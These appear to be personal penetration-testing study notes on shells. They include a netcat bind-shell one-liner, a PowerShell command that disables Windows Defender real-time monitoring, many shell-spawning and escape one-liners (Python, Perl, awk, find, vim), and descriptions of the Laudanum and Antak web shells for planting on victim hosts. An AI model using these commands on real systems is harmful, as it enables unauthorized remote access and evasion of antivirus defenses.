# <mark class="hltr-pink">Shell Basics</mark>
## <mark class="hltr-cyan">Bind Shells</mark>

![[Pasted image 20240805180817.png]]

### <mark class="hltr-orange">Server - Binding a Bash shell to the TCP session</mark>

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

## <mark class="hltr-cyan">Reverse Shells</mark>

![[Pasted image 20240805182314.png]]

### <mark class="hltr-orange">Windows Disable AV</mark>

If you already have administrative privileges over a windows machine, and you want to establish a reverse shell but the Windows Defender antivirus (AV) gets in the way you can disable it by running powershell an an admin and running this command:

```powershell-session
Set-MpPreference -DisableRealtimeMonitoring $true
```

# <mark class="hltr-pink">NIX Shells</mark>
## <mark class="hltr-cyan">Spawning interactive shells</mark>

- Python
```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL-z
stty raw -echo; fg
```

- Bash
```
/bin/sh -i
```
or
```
/bin/bash -i
```

- Perl
```shell-session
perl —e 'exec "/bin/sh";'
```
- Perl (inside a perl shell)
```shell-session
exec "/bin/sh";
```

- Ruby (inside a ruby shell)
```shell-session
exec "/bin/sh"
```

- Lua (inside a lua shell)
```shell-session
os.execute('/bin/sh')
```

- AWK
```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

- Using find for a shell
```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

- Using exec to launch a shell
```shell-session
find . -exec /bin/sh \; -quit
```

- vim to shell
```shell-session
vim -c ':!/bin/sh'
```

- inside vim
```shell-session
vim
:set shell=/bin/sh
:shell
```
or
```
vim
:terminal
```

# <mark class="hltr-pink">Web Shells</mark>
## <mark class="hltr-cyan">Laudanum</mark>

Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more.

Laudanum files are found in `/usr/share/laudanum`.

### <mark class="hltr-orange">Laudanum ASPX Web Shell</mark>

Make sure to edit the shell file (add your IP)

![[Pasted image 20240808180102.png]]

## <mark class="hltr-cyan">Antak Webshell</mark>

Antak is a web shell built-in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang).

Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.

The Antak files can be found in the `/usr/share/nishang/Antak-WebShell` directory.

Antak web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send. As a web shell, Antak is a pretty powerful tool.

Modify the shell file (changer username and passwd)

![[Pasted image 20240808180151.png]]

